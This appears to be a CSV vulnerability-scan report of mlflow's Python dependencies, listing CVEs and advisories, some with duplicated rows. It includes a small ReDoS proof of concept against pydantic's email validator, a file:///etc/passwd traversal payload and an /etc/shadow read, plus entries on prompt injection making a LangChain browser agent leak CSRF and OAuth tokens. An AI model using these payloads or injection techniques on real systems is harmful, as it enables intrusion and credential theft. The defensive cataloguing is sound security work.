mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-2511,CWE-1325,2024-04-08,OpenSSL是一个开源的能够实现安全套接层（SSL）和安全传输层（TLS）协议的通用加密库，常用于车云通信中对传输协议的加解密。该组件支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL组件在某些非默认的服务器配置下，TLSv1.3会话处理可能造成内存无限增长，进而导致拒绝服务。,3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-6119,CWE-843,2024-09-03,<p>OpenSSL 是一个广泛使用的开源加密库，主要用于实现 TLS/SSL 协议。该漏洞影响执行证书名称检查的应用程序（例如 TLS 客户端检查服务器证书）。在某些情况下，当应用程序尝试将预期名称与 X.509 证书的其他名称（otherName）字段进行比较时，可能会导致读取无效的内存地址，进而导致应用程序异常终止。需要注意的是，基本的证书链验证（例如签名、日期等）不受影响，只有在应用程序指定了预期的 DNS 名称、电子邮件地址或 IP 地址时，才可能导致拒绝服务。</p>,2,2
mlflow_mlflow,langchain,0.1.20,True,CVE-2024-3095,CWE-918,,<p>LangChain 是一个通过可组合性构建应用程序的框架。该框架中的 Web Research Retriever 组件存在服务器端请求伪造 (SSRF) 漏洞。该漏洞发生的根本原因是该组件未对请求进行适当限制，允许其访问本地地址。攻击者利用该漏洞可以进行端口扫描、访问本地服务，并在云环境中读取实例元数据。尽管只允许通过 GET 请求进行攻击，但仍可能会影响机密性、完整性和可用性。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,CVE-2024-5998,CWE-502,,<p>LangChain 是一个开源的 Python 库，旨在通过组合性构建基于大语言模型的应用程序。在其 FAISS.deserialize_from_bytes 函数中，存在不信任数据的 pickle 反序列化漏洞。此漏洞的根源在于未能充分验证反序列化后的数据有效性，攻击者可以通过操控输入数据来执行任意命令，利用 os.system 函数。利用此漏洞，攻击者只需向应用程序发送恶意构造的序列化数据即可触发该漏洞。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,CVE-2024-8309,CWE-89 CWE-74,,<p>LangChain 是一个开源框架，用于开发由大型语言模型（LLM）支持的应用程序。版本 0.2.5 存在 SQL 注入漏洞，此漏洞源于 GraphCypherQAChain 类的不充分输入验证，攻击者可以通过提示注入恶意 SQL 命令来操纵、删除或创建数据。这可能导致未经授权的数据操纵、服务中断、数据泄露、多租户环境的安全漏洞和数据完整性问题。</p>,4,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>langchain_community是一个基于Python的开源库，旨在简化图形数据库与机器学习的集成。此漏洞存在于Neo4jVector类中，导致对用户输入的清理不足，允许攻击者通过node_label或embedding_node_property进行Cypher注入。攻击者可以通过不安全的用户输入创建、修改或删除数据库中的节点。</p>,1,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>Langchain 是一个用于构建语言模型应用程序的Python库。该漏洞影响到用 Playwright 浏览器工具包创建的 LLM 浏览器 AI 代理，当目标网站中包含 visibility:hidden 的元素时，外部攻击者可以通过恶意提示获取这些元素的值。这些元素可能包含用于安全目的的令牌，如 CSRF 令牌，此外在 OAuth 2.0 response_mode=form_post 中，包含了用于身份验证和授权的 ID 令牌和访问令牌。这一漏洞的根本原因在于在处理隐藏字段时缺乏严格的安全机制，从而导致通过被注入的恶意代码泄露重要的安全令牌。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>TiDBChatMessageHistory 类是 langchain 库的一部分，该类用于管理聊天消息的历史记录并从数据库加载消息。该漏洞源于对 parameters 参数 (earliest_time) 的类型未进行验证，攻击者可以通过构造恶意输入来控制数据库查询。具体而言，攻击者可以在 _load_messages_to_cache 方法中传入恶意的 earliest_time 值，从而执行任意 SQL 查询。这使得攻击者能够窃取数据库内容。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>MRKLOutputParser 是 Langchain 库中的一个输出解析器，负责解析输入文本并确定相应的操作。然而，该组件的 'parse' 函数未能有效处理输入文本中的正则表达式，当文本中包含恶意输入时，可能导致拒绝服务（ReDoS）攻击。由于正则表达式的执行时间与输入大小呈指数关系，恶意输入可能导致解析时间显著增加，进而使服务器变得不可用。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>Langchain 是一个用于简化文档加载和处理的 Python 库，具有灵活性和可扩展性。该漏洞允许攻击者使用 'file://' URL 方案从服务器读取任意文件的内容，进而导致敏感信息泄露。具体来说，漏洞源于 PlaywrightWebBaseLoader 组件未能正确限制用户输入，攻击者能够触发页面内容加载任意文件。通过构造特定的请求，攻击者可以下载配置文件、环境变量等敏感信息。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>BibtexLoader 是 Langchain 社区的一个组件，旨在从 bib 文件中提取引用的文献并加载相关的 PDF 文件。该漏洞是由文件名未经过验证引起的，允许攻击者读取位于 bib 文件目录以外的任意 PDF 文件。例如，攻击者可以通过构造特定的 bibtex 条目来访问上层目录中的 '1.pdf' 文件，从而导致未授权的数据访问。</p>,3,1
mlflow_mlflow,langchain,0.1.20,True,,,,<p>Langchain 是一个基于 Python 的数据处理库，用于构建数据处理管道。该库中的 split_text_from_url 方法存在服务器端请求伪造漏洞，攻击者可以利用这一方法来访问敏感的服务器文件或执行恶意代码。攻击者只需提供特制的 URL，例如通过路径遍历载荷（如 file:///etc/passwd）或恶意的 data URI，即可绕过安全限制，从而导致对机密文件的未授权访问或通过注入的转换实现服务器的破坏。</p>,1,1
mlflow_mlflow,pandas,1.5.3,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
mlflow_mlflow,protobuf,4.24.0,True,CVE-2025-4565,CWE-674,2025-06-16,Protobuf 是一种用于序列化结构化数据的库，广泛应用于数据传输、配置文件保存等领域。该漏洞影响 Protobuf 的纯 Python 实现，当对含有任意数量递归组、递归消息或 SGROUP 标签的未受信任数据进行解析时，可能会超过 Python 的递归限制。攻击者可以利用这些递归结构触发无限递归，导致解析进程崩溃，从而造成拒绝服务。,2,2
mlflow_mlflow,pyarrow,8.0.0,True,CVE-2023-47248,CWE-502,,Apache Arrow 是一个跨语言的数据处理平台，支持多种编程语言，并提供高效的数据分析功能。受影响的版本为 0.14.0 到 14.0.0，当应用程序从不受信任的来源读取 Arrow IPC、Feather 或 Parquet 数据时，可能会导致反序列化漏洞。攻击者可以利用恶意文件进行反序列化，从而在服务器上执行任意代码。,1,1
mlflow_mlflow,pyarrow,8.0.0,True,CVE-2024-52338,CWE-502,2024-11-28,Apache Arrow 是一个跨语言的开发平台，用于数据分析的内存列式存储格式。该漏洞涉及到IPC（进程间通信）和Parquet读取器中不可信数据的反序列化。当R包处理来自不可信源（如用户提供的输入文件）的Arrow IPC、Feather或Parquet数据时，可能会导致任意代码执行。,1,2
mlflow_mlflow,pydantic,1.10.6,True,,CWE-1333,2023-10-01,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `validate_email` function due to improper limitation of mail length and the usage of an insecure regular expression.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
mlflow_mlflow,pydantic,1.10.6,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
mlflow_mlflow,pydantic,1.10.6,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
mlflow_mlflow,requests,2.28.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
mlflow_mlflow,requests,2.28.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
mlflow_mlflow,requests,2.28.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
mlflow_mlflow,tornado,6.1,True,,CWE-444,2023-08-15,"## Summary
Tornado interprets `-`, `+`, and `_` in chunk length and `Content-Length` values, which are not allowed by the HTTP RFCs. This can result in request smuggling when Tornado is deployed behind certain proxies that interpret those non-standard characters differently. This is known to apply to older versions of haproxy, although the current release is not affected.

## Details
Tornado uses the `int` constructor to parse the values of `Content-Length` headers and chunk lengths in the following locations:
### `tornado/http1connection.py:445`
```python3
            self._expected_content_remaining = int(headers[""Content-Length""])
```
### `tornado/http1connection.py:621`
```python3
                content_length = int(headers[""Content-Length""])  # type: Optional[int]
```
### `tornado/http1connection.py:671`
```python3
            chunk_len = int(chunk_len_str.strip(), 16)
```
Because `int(""0_0"") == int(""+0"") == int(""-0"") == int(""0"")`, using the `int` constructor to parse and validate strings that should contain only ASCII digits is not a good strategy. 

",3,-2
mlflow_mlflow,tornado,6.1,True,CVE-2023-28370,CWE-601,2023-05-16,"Tornado是中国龙卷风科技（Tornado）社区的一个Python Web框架和异步网络库。该库通过使用非阻塞网络I / O，可以扩展到成千上万的开放连接，使其非常适合 长时间轮询， WebSocket和其他需要与每个用户建立长期连接的应用程序。
Tornado 6.3.1及之前版本存在安全漏洞，该漏洞源于存在开放重定向漏洞，当访问特制URL时，使用受影响产品的网站用户可能会被重定向到任意网站。",3,0
mlflow_mlflow,tornado,6.1,True,,CWE-444,2023-08-15,"## Overview
[tornado](https://github.com/tornadoweb/tornado) is a Python web framework and asynchronous networking library, originally developed at FriendFeed.

Affected versions of this package are vulnerable to HTTP Request Smuggling due to improper parsing of the `-`, `+`, and `_` characters in chunk length and `Content-Length` fields through the `int` constructor.

**Note:**
Exploiting this vulnerability is possible if Tornado is deployed behind certain proxies that interpret non-standard characters differently, such as older versions of haproxy.
## Remediation
Upgrade `tornado` to version 6.3.3 or higher.
## References
- [GitHub Commit](https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe)
- [GitHub Release](https://github.com/tornadoweb/tornado/releases/tag/v6.3.3)
",3,0
mlflow_mlflow,tornado,6.1,True,,CWE-444,2023-11-01,"## Overview
[tornado](https://github.com/tornadoweb/tornado) is a Python web framework and asynchronous networking library, originally developed at FriendFeed.

Affected versions of this package are vulnerable to HTTP Request Smuggling via the `parse` and `validate strings` capabilities in the `int` constructor. 

**Notes:**

1) This is possible when Tornado is deployed behind certain proxies that interpret those non-standard characters differently.
2) This is known to apply to older versions of `haproxy`, although the current release is not affected.
## Remediation
Upgrade `tornado` to version 6.3.3 or higher.
## References
- [GitHub Commit](https://github.com/tornadoweb/tornado/commit/217295b1dd30f556ea374d62007f6821688f00f0)
- [GitHub Commit](https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe)
",3,0
mlflow_mlflow,tornado,6.1,True,CVE-2024-52804,CWE-400 CWE-770,2024-11-22,Tornado 是一个 Python Web 框架和异步网络库，用于构建高性能的网络应用程序。在 6.4.2 之前的版本中，其解析 HTTP Cookie 的算法存在性能问题。该算法在解析精心构造的恶意 Cookie 头时，会表现出二次复杂度，导致过度的 CPU 消耗，这种解析发生在事件循环线程中，可能阻塞其他请求处理。,3,2
mlflow_mlflow,tornado,6.1,True,CVE-2025-47287,CWE-770,2025-05-15,Tornado 是一个 Python Web 框架和异步网络库。当 Tornado 的 `multipart/form-data` 解析器遇到特定错误时，它会记录警告信息但继续尝试解析剩余数据。这允许远程攻击者生成极大量的日志，从而构成拒绝服务（DoS）攻击。所有低于 6.5.0 版本的 Tornado 均受影响。,2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-4741,CWE-416,2024-05-28,在某些情况下，调用OpenSSL API函数SSL_free_buffers可能导致访问已释放的内存。具体来说，当处理来自网络的记录时，如果记录头已接收但记录体尚未到达，或者记录数据部分被读取但缓冲区仍在使用的情况下调用SSL_free_buffers会成功，从而导致内存使用后释放的漏洞。,2,2
mlflow_mlflow,cryptography,39.0.1,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mlflow_mlflow,cryptography,39.0.1,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mlflow_mlflow,cryptography,39.0.1,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-26130,CWE-476,2024-02-21,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 38.0.0版本至42.0.4之前版本存在安全漏洞，该漏洞源于NULL指针取消引用，从而导致Python进程崩溃。",2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-6237,CWE-606,2024-01-15,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0及更高版本存在安全漏洞，该漏洞源于调用EVP_PKEY_public_check（）函数并提供不可信的RSA密钥时容易受到拒绝服务（DOS）攻击。",3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-6129,CWE-440 CWE-787,2024-01-09,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0.0 到 3.0.12、3.1.0 到 3.1.4 和 3.2.0版本存在安全漏洞，该漏洞源于POLY1305 MAC算法存在安全问题。",3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-49083,CWE-476,2023-11-29,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python cryptography 3.1到 41.0.6版本存在代码问题漏洞，该漏洞源于加载 PKCS7 证书时可能会导致空指针取消引用和段错误。",3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-2511,CWE-1325,2024-04-08,OpenSSL是一个开源的能够实现安全套接层（SSL）和安全传输层（TLS）协议的通用加密库，常用于车云通信中对传输协议的加解密。该组件支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL组件在某些非默认的服务器配置下，TLSv1.3会话处理可能造成内存无限增长，进而导致拒绝服务。,3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-6119,CWE-843,2024-09-03,<p>OpenSSL 是一个广泛使用的开源加密库，主要用于实现 TLS/SSL 协议。该漏洞影响执行证书名称检查的应用程序（例如 TLS 客户端检查服务器证书）。在某些情况下，当应用程序尝试将预期名称与 X.509 证书的其他名称（otherName）字段进行比较时，可能会导致读取无效的内存地址，进而导致应用程序异常终止。需要注意的是，基本的证书链验证（例如签名、日期等）不受影响，只有在应用程序指定了预期的 DNS 名称、电子邮件地址或 IP 地址时，才可能导致拒绝服务。</p>,2,2
mlflow_mlflow,langchain,0.1.20,True,CVE-2024-3095,CWE-918,,<p>LangChain 是一个通过可组合性构建应用程序的框架。该框架中的 Web Research Retriever 组件存在服务器端请求伪造 (SSRF) 漏洞。该漏洞发生的根本原因是该组件未对请求进行适当限制，允许其访问本地地址。攻击者利用该漏洞可以进行端口扫描、访问本地服务，并在云环境中读取实例元数据。尽管只允许通过 GET 请求进行攻击，但仍可能会影响机密性、完整性和可用性。</p>,3,1
